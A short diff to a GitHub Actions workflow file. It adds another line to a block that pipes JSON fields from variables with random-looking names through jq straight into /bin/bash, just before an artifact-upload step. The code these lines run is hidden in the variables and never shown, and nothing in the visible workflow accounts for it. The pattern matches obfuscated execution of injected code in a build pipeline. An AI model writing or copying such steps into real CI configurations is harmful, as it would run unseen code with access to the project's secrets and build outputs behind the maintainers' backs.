@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$xm71" | jq -r .dvnrd87 | /bin/bash
           printf '%s' "$z57" | jq -r .vhy7113 | /bin/bash
           printf '%s' "$jlx32334" | jq -r .kt7 | /bin/bash
+          echo $kto71 | jq -r .hwot4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
